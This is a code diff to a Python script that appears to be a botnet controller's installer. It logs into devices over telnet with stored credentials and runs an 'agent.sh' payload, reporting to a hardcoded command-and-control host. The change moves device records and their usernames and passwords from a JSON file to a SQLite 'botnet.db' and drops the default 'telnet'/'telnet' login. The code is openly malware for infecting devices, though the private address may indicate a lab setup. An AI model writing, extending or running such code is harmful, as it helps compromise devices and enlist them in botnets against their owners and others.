@@ -6,32 +6,26 @@ import inspect;
 import sys;
 import os;
 import telnetlib3;
+import sqlite3
 
 path = os.path.dirname(inspect.stack()[0][1])
+default_db_path = os.path.join(os.path.dirname(inspect.stack()[0][1]), "../db/botnet.db")
+DB   = os.getenv("DB_PATH", default_db_path)
 CC_HOST = "172.18.0.1"
 CC_PORT = "8000"
 
-def add_device(name, ip, alive):
-    with open(path + "/../db/devices.json", "r+") as file:
-        file_json = json.load(file)
-        new_device = {
-                "id": len(file_json) + 1,
-                "name": name,
-                "ip": ip,
-                "alive": alive
-                }
-        file_json.append(new_device)
-        file.seek(0)
-        json.dump(file_json, file, indent=4)
-        file.truncate()
+def get_con():
+    con = sqlite3.connect(DB, check_same_thread=False)
+    con.execute("PRAGMA journal_mode=WAL")  # safe alongside controller process
+    return con
 
 def main():
-    add_device("test", "0.0.0.0", False)
+    print("Hi I'm main and I'm useless for now :/\n")
 
 
 # this and the below function install programs have the purpose of
 # logging in to the devices and downloading the agent payload to them
-async def shell(reader, writer, username, password, dev_id):
+async def shell(reader, writer, dev_id, username, password):
     logged_in = False
 
     while True:
@@ -57,10 +51,22 @@ async def shell(reader, writer, username, password, dev_id):
                 writer.write(f"./agent.sh\r\n")
                 writer.write("exit\r\n")
             
+def get_device_data_from_db(ip):
+    con = get_con()
+    rows = con.execute(
+            """
+            SELECT device_id, username, password
+            FROM devices
+            WHERE ip=?
+            """, [ip]).fetchone()
+    con.close()
+
+    return rows
 
 async def install_programs(ip):
+    data = get_device_data_from_db(ip)
     reader, writer = await telnetlib3.client.open_connection(ip, 23);
-    await shell(reader, writer, 'telnet', 'telnet', 1);
+    await shell(reader, writer, data[0], data[1], data[2]);
 
 if __name__ == "__main__":
     if len(sys.argv) > 1:
